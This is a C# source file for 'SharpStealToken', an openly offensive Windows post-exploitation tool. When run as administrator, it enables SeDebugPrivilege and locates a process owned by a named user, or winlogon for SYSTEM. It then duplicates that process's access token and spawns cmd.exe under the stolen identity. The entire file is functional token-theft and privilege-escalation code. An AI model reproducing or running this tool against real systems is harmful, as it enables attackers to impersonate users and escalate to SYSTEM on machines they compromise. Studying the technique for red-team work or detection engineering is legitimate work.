using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Management;
using System.Runtime.InteropServices;
using static SharpStealToken.Class1;


namespace SharpStealToken
{
    public class Program
    {
        static bool IsRunningAsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static string GetOwner(int processId)
        {
            string query = $"SELECT * FROM Win32_Process WHERE ProcessId = {processId}";
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
            using (ManagementObjectCollection results = searcher.Get())
            {
                foreach (ManagementObject mo in results)
                {
                    object[] outParameters = new object[2];
                    mo.InvokeMethod("GetOwner", outParameters);
                    return $"{outParameters[0]}";
                }
            }
            return null;
        }

        static int GetProcessIdByUser(string userName)
        {
            var query = $"SELECT ProcessId FROM Win32_Process WHERE Name LIKE '%'";
            var searcher = new ManagementObjectSearcher(query);

            foreach (ManagementObject obj in searcher.Get())
            {
                int processId = Convert.ToInt32(obj["ProcessId"]);
                //Process process = Process.GetProcessById(processId);
                string owner = GetOwner(processId);

                if (owner == userName)
                {
                    return processId;
                }
            }
            return -1;
        }
        
        public static bool EnableWindowsPrivilege(string privilege)
        {
            LUID luid;
            if (!LookupPrivilegeValue(null, privilege, out luid))
            {
                Console.WriteLine("Failed to lookup privilege value.");
                return false;
            }

            IntPtr currentProcess = GetCurrentProcess();
            IntPtr currentToken;
            if (!OpenProcessToken(currentProcess, (uint)TokenAccess.TOKEN_ALL_ACCESS, out currentToken))
            {
                Console.WriteLine("Failed to open process token.");
                return false;
            }

            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
            {
                PrivilegeCount = 1,
                Privileges = new LUID_AND_ATTRIBUTES[1]
            };
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            if (!AdjustTokenPrivileges(currentToken, false, ref tp, (uint)Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero))
            {
                Console.WriteLine("Failed to adjust token privileges.");
                return false;
            }

            PRIVILEGE_SET privs = new PRIVILEGE_SET
            {
                PrivilegeCount = 1,
                Control = PRIVILEGE_SET.PRIVILEGE_SET_ALL_NECESSARY,
                Privilege = new LUID_AND_ATTRIBUTES[1]
            };
            privs.Privilege[0].Luid = luid;
            privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

            bool bResult;
            if (!PrivilegeCheck(currentToken, ref privs, out bResult))
            {
                Console.WriteLine("Failed to check privilege.");
                return false;
            }

            return bResult;
        }

        static void StealToken(int processId)
        {
            var process = Process.GetProcessById(processId);

            var hToken = IntPtr.Zero;
            var hTokenDup = IntPtr.Zero;
            var sa = new SECURITY_ATTRIBUTES();
            var si = new STARTUPINFO();
            string cmd = @"C:\Windows\System32\cmd.exe";

            try
            {

            // open handle to token
            if (!OpenProcessToken(process.Handle, (uint)DesiredAccess.TOKEN_DUPLICATE | (uint)DesiredAccess.TOKEN_ASSIGN_PRIMARY | (uint)DesiredAccess.TOKEN_QUERY, out hToken))
            {
                Console.Error.WriteLine($"+ failed to open process token: {Marshal.GetLastWin32Error()}");
                return;
            }
            
            // duplicate token
            if (!DuplicateTokenEx(hToken, TokenAccess.TOKEN_ALL_ACCESS, ref sa,
                SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                TOKEN_TYPE.TokenImpersonation, out hTokenDup))
            {
                Console.Error.WriteLine($"+ failed to duplicate token: {Marshal.GetLastWin32Error()}");
                return;
            }

            // impersonate token
            if (CreateProcessWithTokenW(hTokenDup, 0x00000002, null, cmd, 0x00000010, IntPtr.Zero, null, ref si, out PROCESS_INFORMATION pi))
            {
                var identity = new WindowsIdentity(hTokenDup);
                Console.WriteLine($"+ successfully impersonate {identity.Name}");
                return;
            }

            Console.Error.WriteLine($"+ failed to impersonate token: {Marshal.GetLastWin32Error()}");
            return;

            }
            catch
            {

            }
            finally
            {
                // close token handles
                if (hToken != IntPtr.Zero) CloseHandle(hToken);
                if (hTokenDup != IntPtr.Zero) CloseHandle(hTokenDup);

                process.Dispose();
            }

            Console.Error.WriteLine($"+ unknown error: {Marshal.GetLastWin32Error()}");
            return;
        }

        static void Main(string[] args)
        {
            Console.WriteLine($"        --++ R3dw0lv3s ++--");
            Console.WriteLine($"     --++ SharpStealToken ++--\n");

            if (args.Length < 1)
            {
                Console.WriteLine("+ use: SharpStealToken.exe \"johndoe\" or SharpStealToken.exe \"SYSTEM\"");
                return;
            }

            if (!IsRunningAsAdministrator())
            {
                Console.WriteLine("+ necessary admin privs");
                return;
            }

            Console.WriteLine($"+ current process as: {WindowsIdentity.GetCurrent().Name}");

            if (!EnableWindowsPrivilege("SeDebugPrivilege"))
            {
                Console.WriteLine($"+ error adjusting priv {Marshal.GetLastWin32Error()}");
                return;
            }
            Console.WriteLine($"+ SeDebugPrivilege enable");

            string userName = args[0];

            if (userName == "SYSTEM")
            {
                Process winLogon = Process.GetProcessesByName("winlogon")[0];
                StealToken(winLogon.Id);
            }
            else
            {
                int processId = GetProcessIdByUser(userName);
                if (processId != -1)
                {
                    Console.WriteLine($"+ processId for {userName} found: {processId}");

                    StealToken(processId);
                }
            }


        }
    }
}